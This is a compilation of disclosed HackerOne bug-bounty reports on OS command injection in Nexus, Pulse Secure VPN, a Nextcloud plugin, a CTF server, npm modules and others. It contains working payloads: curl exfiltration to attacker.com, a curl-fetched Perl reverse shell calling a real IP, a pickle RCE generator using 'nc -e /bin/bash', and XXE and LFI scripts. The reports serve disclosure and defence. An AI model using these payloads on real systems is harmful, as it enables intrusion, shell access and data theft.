So, on the Kali machine, run the next command:

```
ls /tmp/poc.txt
```

And ensure that the file was created.

Also it's possible to check this vulnerability without usage of additional windows machine. The above exploit may be run on Kali Linux machine:

exploit.py:

```
#!/bin/python3

import requests

target = "http://127.0.0.1:3420" #put target IP and port here
cmd = r"touch /tmp/poc.txt" #a command to execute
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print ("Done.")
```
run it:

```
chmod 755 exploit.py
pip3 install requests
python3 exploit.py
```

and check the result with the following command:
```
ls /tmp/poc.txt 
```

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker can achieve Remote Code Execution (RCE) without any conditions.

---

### [OS Command Injection in Nexus Repository Manager 2.x](https://hackerone.com/reports/654888)

- **Report ID:** `654888`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Central Security Project
- **Reporter:** @christianaugust
- **Bounty:** - usd
- **Disclosed:** 2019-08-20T19:55:59.714Z
- **CVE(s):** CVE-2019-5475

**Vulnerability Information:**

# Maven artifact
**groupId:** org.sonatype.nexus.plugins
**artifactId:** nexus-yum-repository-plugin
**version:** 2.14.9-01

# Vulnerability
## Vulnerability Description
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability. 

## Additional Details
**Source File and Line Number:** https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121

## Steps To Reproduce:
1. Navigate to "Capabilities" in Nexus Repository Manager.
2. Edit or create a new Yum: Configuration capability
3. Set path of "createrepo" or "mergerepo" to an OS command (e.g. C:\Windows\System32\calc.exe)
4. The OS command should now have executed as the SYSTEM user. Note that in this case, Nexus appends --version to the OS command.

The following HTTP request was used to trigger the vulnerability:
```
PUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1
Host: HOST:PORT
Accept: application/json
Authorization: Basic YWRtaW46YWRtaW4xMjM=
Content-Type: application/xml
Content-Length: 333
Connection: close

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns2:capability xmlns:ns2="http://sonatype.org/xsd/nexus-capabilities-plugin/rest/1.0"><id>healthcheck</id><notes>123</notes><enabled>true</enabled><typeId>1</typeId><properties><key>createrepoPath</key><value>C:\Windows\System32\calc.exe</value></properties></ns2:capability>
```
## Supporting Material/References:
- Windows Server 2016
- Sonatype Nexus Repository Manager 2.14.9-01
- Java 8

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.

**Summary (team):**

https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09

---

### [Potential pre-auth RCE on Twitter VPN](https://hackerone.com/reports/591295)

- **Report ID:** `591295`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** X / xAI
- **Reporter:** @orange
- **Bounty:** 20160 usd
- **Disclosed:** 2019-08-10T15:06:45.375Z
- **CVE(s):** CVE-2019-11510, CVE-2019-11542, CVE-2019-11539, CVE-2019-11538, CVE-2019-11508, CVE-2019-11540

**Vulnerability Information:**

Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE. Recently, we are doing a research about SSL VPN security, and found several critical vulnerabilities on Pulse Secure SSL VPN! We have reported to vendor and [patches](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101) have been released on `2019/4/25`. Since that, we keep monitoring numerous large corporations using Pulse Secure and we noticed that Twitter haven't patched the SSL VPN server over one month!

These vulnerabilities include a pre-auth file reading(CVSS 10) and a post-auth(admin) command injection(CVSS 8.0) which can be chained into a pre-auth RCE! Here are all vulnerabilities we found:

* CVE-2019-11510 - Pre-auth Arbitrary File Reading
* CVE-2019-11542 - Post-auth Stack Buffer Overflow
* CVE-2019-11539 - Post-auth Command Injection
* CVE-2019-11538 - Post-auth Arbitrary File Reading
* CVE-2019-11508 - Post-auth Arbitrary File Writing
* CVE-2019-11540 - Post-auth Session Hijacking


## Our Steps

First, we download following files with CVE-2019-11510:
1. `/etc/passwd`
2. `/etc/hosts`
3. `/data/runtime/mtmp/system`
4. `/data/runtime/mtmp/lmdb/dataa/data.mdb`
5. `/data/runtime/mtmp/lmdb/dataa/lock.mdb`
6. `/data/runtime/mtmp/lmdb/randomVal/data.mdb`
7. `/data/runtime/mtmp/lmdb/randomVal/lock.mdb`

██████████


The VPN user and hashed passwords are stored in the file `mtmp/system`. However, Pulse Secure caches the plain-text password in the `dataa/data.mdb` once the user log-in. Here, we just grep part of username/plain-text-password for proofs and further actions.

*P.S. we mask the password field for security concerns, and we can send to you if you provide your PGP key.*

```
█████████ / ████
█████████ / ██████
█████ / █████████
██████████ / █████████
███ / ██████
```

Once we log into the SSL VPN, we found the server has enabled the Two-Factor Authentication. Here, we listed two methods to bypass the 2FA:

████

1. We observed Twitter using the 2FA solution from Duo.com. With the file `mtmp/system`, we could obtain the integration key, secret key, and API hostname, which should be protected carefully according to the [Duo documentation](https://duo.com/docs/pulseconnect):

    > Treat your secret key like a password
    The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Don't share it with unauthorized individuals or email it to anyone under any circumstances!

    ```
    # secret-key = ██████████
    ████
    dc=███,dc=duosecurity,dc=com
    cn=<USER>

    # LDAP password = ██████████
    ██████████
    █████
    ███████
    uid=<username>
    ```

2. The Pulse Secure stores the user session in the `randomVal/data.mdb`. Without `Roaming Session` option enabled, we can reuse the session and log into your SSL VPN!

██████████



The next, in order to trigger the command injection(CVE-2019-11542). We leverage the web proxy function to access the admin interface with following URL:

```
https://0/admin/
```

████████

We are now trying to crack the admin hash by GPU. It seems takes a long time, but once we cracked, we can achieve RCE absolutely. Actually, we can simply wait for the admin login and obtain the plain-text password directly!
```
███████
███████
```

Anyway, we decided to report to you first, because it's lethal and critical. If you want, we can provide the RCE PoC in admin interface in order to proof the potential risk!


## Impact:

1. Access Intranet(we have accessed the `███████` for proof) ██████████
2. Plenty of staff plain-text passwords
3. Internal server and passwords(such as the LDAP)
4. Attack back all VPN clients(we will detail the step in [Black Hat USA 2019](https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545))
5. Private keys
6. Sensitive cookies in Web VPN(such as okta, salesforce, box.com and google)

## Supporting Material/References:

We attached screenshots to proof our actions. For security concern, we didn't attach the `mtmp/system` and the `dataa/data.mdb`. If you want, we can send to you with your PGP key encrypted!

## Recommend Solution

The only and simplest way to solve this problem is to upgrade your SSL VPN to the [latest version](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101)!

## Impact

1. Access Intranet(we have accessed the `████████` for proof) ████
2. Plenty of staff plain-text passwords
3. Internal server and passwords(such as the LDAP)
4. Attack back all VPN clients(we will detail the step in [Black Hat USA 2019](https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545))
5. Private keys
6. Sensitive cookies in Web VPN(such as okta, salesforce, box.com and google)

**Summary (researcher):**

Thanks Twitter Security Team again :) The details can be found here!
* [Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!](https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html)

---

### [Remote Code Execution via Extract App Plugin](https://hackerone.com/reports/546753)

- **Report ID:** `546753`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** Nextcloud
- **Reporter:** @hdbreaker
- **Bounty:** - usd
- **Disclosed:** 2019-05-30T07:17:04.686Z
- **CVE(s):** CVE-2019-5441

**Vulnerability Information:**

Hi, I found a critical issue in the Add-on "Extract" listed in the Nextcloud Marketplace: https://apps.nextcloud.com/apps/extract (This extension can be installed directly from Nextcloud Application)

The vulnerability was found in file: extract/lib/Controller/ExtractionController.php line 102.

The affected code can be seen below:

```
if (extension_loaded ("rar")){
				$rar_file = rar_open($file);
				$list = rar_list($rar_file);
				var_dump($rar_file);
				foreach($list as $fileOpen) {
					$entry = rar_entry_get($rar_file, $fileOpen->getName());
					$entry->extract($dir); // extract to the current dir
					self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fileOpen->getName());
				}
				rar_close($rar_file); 
			}else{
                ######## BUG HERE #########
				exec("unrar x \"".$file."\" -R \"".$dir."\" -o+",$output,$return);
                #########################
				foreach ($output as $val ) {
					if(preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[0] == "Extracting" && 
					preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[1] != "from"){
						$fichier = substr(strrchr($PATH, "/"), 1);
						self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fichier);
					}
				}
			}
```

The unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.

```
nameOfFile=sample.rar"|curl www.attacker.com:443/data?id=$(id | base64)|"&directory=&external=0
```

Abusing this issue I was able to take full control of the demo instance: https://demo.nextcloud.com/lun0shai/

The steps to reproduce this PoC can be seen below:

1) Create a demo instance in https://demo.nextcloud.com and login.
2) Install the plugin Extract directly from the Apps menu:

{F474350}

3) Once the Add-on is installed, the attacker needs to upload a sample.rar file:

{F474351}

4) Then, the attacker needs to use the functionality "Extract Here" from the context menu and intercept the HTTP Request with BurpSuite:

{F474352}

Burp Interceptor:
{F474356}

5) At this point, the attacker can manipulate the $nameOfFile and & $dir parameters to achieve Remote Code Execution in the Nextcloud Instance. This PoC of RCE was performed over a Demo Instance running the latest version of NextClou.

To achieve RCE over Demo Instance 2 payloads were needed:

a) The attacker needs to force the application to download a Perl Reverse Shell to /tmp folder using curl, this was achieved using the following HTTP Request:

Note: 
My server IP is: 138.68.1.244

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 98
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|"&directory=&external=0
```

HTTP Response:
```
HTTP/1.1 200 OK
Date: Tue, 23 Apr 2019 08:24:50 GMT
Server: Apache
Strict-Transport-Security: max-age=15768000
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-bXBVNko3dWtWZnFVMzl3QnpTMHBlSkwvYlhhSWtLczZXelhlTFRkMGNJdz06L3ZsUFFOU1FlcEQ2dkkxQW9YNVlPL2lMSFFHNjVwTnFId3lUSGxnQ0tiZz0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self' stun.nextcloud.com:443;media-src 'self';frame-src https://demo.nextcloud.com
X-Frame-Options: SAMEORIGIN
Content-Length: 4
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
Content-Type: application/json; charset=utf-8
Connection: close

null
```

The above request wrote the following reverse shell in /tmp/shell.pl
```
use Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}
```

(At this point a Netcat Listener was running on my Server)
{F474360}

b) A second HTTP Request was needed to execute the Perl Reverse Shell and gain full shell access over the remote server (demo.nextcloud.com):

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 66
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|perl /tmp/shell2.pl|"&directory=&external=0
```

After these steps, my Server (IP: 138.68.1.244) received the Reverse Shell successfully and I was able to move freely over the Docker Instance of Nextcloud, reading even the config file as can be seen below:

An inbound connection from demo.nextcloud.com was received
{F474361}

Content of /config/config.php
{F474362}

Hope this could help to improve your security and check continuously the Applications that you spread using your market.

Please do not hesitate to contact me if you need any help to detect/resolve this issue.

Regards,

## Impact

An authenticated user could use the Extract Plugin listed in the Apps Market of Nextcloud to achieve Remote Code Execution in any Nextcloud instance.

---

### [Jenkins Unauthenticated RCE on https://djangoci.com/](https://hackerone.com/reports/579760)

- **Report ID:** `579760`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Django
- **Reporter:** @j3ssie
- **Bounty:** - usd
- **Disclosed:** 2019-05-16T02:05:17.974Z
- **CVE(s):** CVE-2018-1000861, CVE-2019-1003005, CVE-2019-1003029

**Summary (team):**

This report discloses an RCE issue on djangoci.com as outlined in https://www.djangoproject.com/weblog/2019/may/15/rce-djangoci/

While technically a valid issue, it is out of scope for bounty, please see https://hackerone.com/django for details on which issues qualify for bounties.

---

### [Remote Command Execution in a internal server to get the flag file](https://hackerone.com/reports/415682)

- **Report ID:** `415682`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** h1-5411-CTF
- **Reporter:** @manoelt
- **Bounty:** - usd
- **Disclosed:** 2018-10-22T17:13:10.696Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
After source code disclosure using a LFI vulnerability and using PHP object injection with XXE I was able to find an internal service at port 1337. Using the SSRF through XXE I sent a HTTP request to this internal service and discovered a python object injection using status parameter, with this vector I was able to get RCE on the server located at 104.248.121.85.

**Description:**

_LFI_
The *template* parameter at /api/generate.php is vulnerable to LFI. So I could get all relevant source code from the application using *type* as text. I created a python script to help:

```
import requests
import sys

url = 'http://h1-5411.h1ctf.com/api/'
endpoint = 'generate.php'

headers = {'Cookie':'PHPSESSID=v6a28uv6ad2e9ivr02hajqao4g'}
payload = {'template' : '../../../../../../..'+sys.argv[1], 'type' : 'text', 'top-text' : '.', 'bottom-text' :'.'}

r = requests.post(url+endpoint, headers=headers, data=payload)
json_response = r.json()

file_url = json_response['meme_path']
print file_url

r = requests.get(url+file_url)
print r.text
```

Using Burp:
{F352386}

Some files read during my tests:
1. /etc/passwd
2. /etc/issue
3. /etc/resolv.conf
4. /etc/hosts
5. /var/log/apt/history.log
6. App source code

_PHP Object Injection - Deserialization and XXE_
After read the code I discovered two endpoints for a future version, 2.0:

File: header.php
```
<?php
  $pages = [
    "generate.php" => "Meme Generator",
    "memes.php" => "Your Memes",
    // for version 2.0
    // "import_memes_2.0.php" => "Import Memes",
    // "export_memes_2.0.php" => "Export Memes"
  ];
?>
```

Looking into import_memes_2.0.php and export_memes_2.0.php I found an unserialization call using user input without validation, which is extremely dangerous. So I craft a payload serializing a *ConfigFile* object with XML in *config_raw* attribute, as __toString() method calls parse() witch then calls loadXML with libxml_disable_entity_loader ENABLED. So, we could obtain XXE and SSRF.

Using PHP to create the payload:
```
<?php
require_once('classes.php'); // Same I got using LFI

$t = new ConfigFile('http://localhost/h1-5411/xml2'); 
$x = new Maintenance();

$o = [$t, $x ];

echo base64_encode(serialize($o));
```

PHP Object example (b64 decoded):
```
a:2:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:276:"<?xml version='1.0' encoding='ISO-8859-1'?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>
<memes><toptext>&xxe;</toptext><bottomtext>A</bottomtext><template>TeMPLaTe123</template><type>XML</type></memes>
";}i:1;O:11:"Maintenance":0:{}}
```

File: xml2
```
<?xml version='1.0' encoding='ISO-8859-1'?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>
<memes><toptext>&xxe;</toptext><bottomtext>A</bottomtext><template>TeMPLaTe123</template><type>XML</type></memes>
```

Then using the serialized object above (ConfigFile), I uploaded my memepak using /import_memes_2.0.php and got the /etc/issue file base64 encoded as one of my memes.


__SSRF__

Using the above XXE we could manipulate the server to do requests for others internal services, as noted at source code there is a Maintenance service somewhere.

Using the python exploit attached {F352404}, I could read files and do http/ftp requests. Although I could do a port scan using http/ftp/sftp requests, I was able to find the internal service using a process ID scan using /proc/{ID}/cmdline, which revealed:

```
/proc
1
ps-run

4
/bin/bash/opt/run/ctf-entrypoint

6
ssh-i/app/92df63a566f599a094153febb133b99f87a161b5-oStrictHostKeyChecking=no-f-N-L1337:localhost:1337maintenance@104.248.121.85

8
/bin/sh/usr/sbin/apache2ctl-DFOREGROUND
```

So I found a ssh tunnel to another service at 104.248.121.85. Using the python script above, I started to interact with http://localhost:1337/ :
 {F352398}

__Python Object Injection - Pickle__

Using the *debug* parameter I realized that *status* parameter should be base64 encoded. After that I could see a pickle base64 encoded as status. My first try was to request a status-update using a malicious pickle as status:

Creating a malicious pickle with a reverse shell:
```
import cPickle
import os
import sys
import base64

DEFAULT_COMMAND = "nc ███████ 9300 -e /bin/bash"

COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))

```
Sending the above Pickle I got a connect back from the server.

{F352400}

## Steps To Reproduce:

I created some python scripts to reproduce.

  1. Use {F352403} to read files from the server (LFI)
  2. Use {F352404} to read files and do requests to internal services. Found http://localhost:1337
  3. Use {F352406} to create a pickle payload for any OS command. With this payload, use {F352404} to send a request to http://localhost:1337/update-status?debug=1&status={PAYLOAD}

## Impact

Compromise data and servers.

---

### [Authenticated RCE in ToughSwitch](https://hackerone.com/reports/273449)

- **Report ID:** `273449`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** Ubiquiti Inc.
- **Reporter:** @maxpl0it
- **Bounty:** - usd
- **Disclosed:** 2018-06-19T12:17:17.553Z
- **CVE(s):** -

**Summary (team):**

In ToughSwitch v1.3.5 and prior, due to lack of validation is possible to execute an CSRF. If an authenticated user access an attacker controlled web page, it could trigger the CSRF and the resulting request could trigger an RCE.

**Summary (researcher):**

An RCE vulnerability existed in the ToughSwitch that could be triggered through CSRF.

---

### [[git-dummy-commit] Command injection on the msg parameter](https://hackerone.com/reports/341710)

- **Report ID:** `341710`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Node.js third-party modules
- **Reporter:** @caioluders
- **Bounty:** - usd
- **Disclosed:** 2018-06-15T21:59:11.029Z
- **CVE(s):** CVE-2018-3785

**Vulnerability Information:**

Hi there, I've found a Command Injection on the "git-dummy-commit" module.

# Module

**module name:** git-dummy-commit
**version:** 1.3.0
**npm page:** https://www.npmjs.com/package/git-dummy-commit

## Module Description

> Create a dummy commit for testing

## Module Stats

[62] downloads in the last day
[94] downloads in the last week
[384] downloads in the last month
[6078]  downloads in the last year

# Vulnerability

## Vulnerability Description

The module appends the `msg` parameter to a command on the [line 37](https://github.com/stevemao/git-dummy-commit/blob/master/index.js#L37)  without escaping it, leading to a command injection.

## Steps To Reproduce:

* Install the module 

```
$ npm install git-dummy-commit
```

* Example code with the malicious payload `";touch a;"` on line 3.

```javascript
const gitDummyCommit = require('git-dummy-commit');

gitDummyCommit('";touch a;"');
```
* Run it.

```
$ node index.js
```

* Check the newly create file `a` 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `git` command.

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker that controls the `msg` parameter can injection command on the victim's machine.

---

### [[buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag](https://hackerone.com/reports/331032)

- **Report ID:** `331032`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-05-11T15:52:15.524Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Remote Code Execution in buttle module.

When buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands.

# Module

**module name:** buttle
**version:** 0.2.0
**npm page:** https://www.npmjs.com/package/buttle

## Module Description

Simple static file (+ markdown) server.


## Module Stats

Stats:

N/A, estimated ~20-40 downloads/week

# Vulnerability

## Vulnerability Description

When buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands. This is possible due to this code:

```javascript
// ./node_modules/buttle/lib/mid-php.js, line 15

    var phpFile = norm(join(docroot, req.url));
    fs.exists(phpFile, function(exists) {
    if(exists) {
        res.setHeader('Content-Type', 'text/html');

        var cp = require('child_process').spawn(phpBin, [phpFile]);

        cp.stdout.on('data', function(data) {
        res.write(data);
        });

        cp.stderr.on('data', function(data) {
        res.write(data);
        });

        cp.on('close', function() {
        res.end('');
        });

    } else {
```

As you can notice, ```spawn()``` method is called with PHP file as an argument, but no sanitization is apllied on ```phpFile``` variable. Using ```curl```, I was able to pass example PHP filename concatenated with ```;[shell cmd]``` string, which allows me to execute command on the server.


## Steps To Reproduce:

- install ```buttle```:

```
$ npm i buttle
```

- create ```test.php``` file with folloing content:

```php
<?php
echo 'Its working!';
?>

```

- run buttle with PHP support:

```
$ ./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php
Listening on port 8080
```

- execute following command in the console:

```
$ curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo "uh oh, RCE :P"
```

- see response from the server containing results of execution of injected commands:

```
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /test.php HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: text/html
< Date: Thu, 29 Mar 2018 10:35:22 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
* Connection #0 to host localhost left intact
Its working!rafal.janicki
Linux LT0081U2 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
/home/rafal.janicki/playground/hackerone/Node
uh oh, RCE :P
```


## Patch

```phpFile``` variable should be sanitized. Ideally, it should strip everything what comes after ```.php``` extension in filename and do not allow to use any Bash special characters (like semicolon, pipe, comma etc.)

## Supporting Material/References:


- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl v. 7.47.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

I hope my report will help to keep Node.js ecosystem and its users safe :)

Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker is able to execute commands on remote server where buttler with --php-bin flag is run.

---

### [RCE via ssh:// URIs in multiple VCS ](https://hackerone.com/reports/260005)

- **Report ID:** `260005`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** Internet Bug Bounty
- **Reporter:** @joernchen
- **Bounty:** - usd
- **Disclosed:** 2017-09-21T16:21:35.503Z
- **CVE(s):** CVE-2017-9800, CVE-2017-1000116, CVE-2017-1000117

**Vulnerability Information:**

I'd like to submit an RCE issue within Git SVN and Mercurial, the CVEs are:

*  CVE-2017-9800 (Subversion)
* CVE-2017-1000116 (Mercurial (hg))
* CVE-2017-1000117 (Git)

Further Info can be found at:

http://blog.recurity-labs.com/2017-08-10/scm-vulns

And product specific:

* https://public-inbox.org/git/xmqqh8xf482j.fsf@gitster.mtv.corp.google.com/T/#u
* http://subversion.apache.org/security/CVE-2017-9800-advisory.txt
* https://about.gitlab.com/2017/08/10/gitlab-9-dot-4-dot-4-released/

I think these issues which all are based on the same flaw could be worth
an IBB Bounty. However I'd like to point out that we at Recurity Labs
would like the bounty being donated to a charity. The to be determined
charity will be something in the field of brain aneurysm, this is due to
the fact that Felix, the founder of Recurity Labs, currently is
recovering from a brain aneurysm.


So, just let us know what you think about this.

Cheers,

joern

P.S. I took the CVSS Score from the Subversion Advisory
the Redhat advisory states a score of 6.3 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L) I guess the truth is somewhere in between.

---
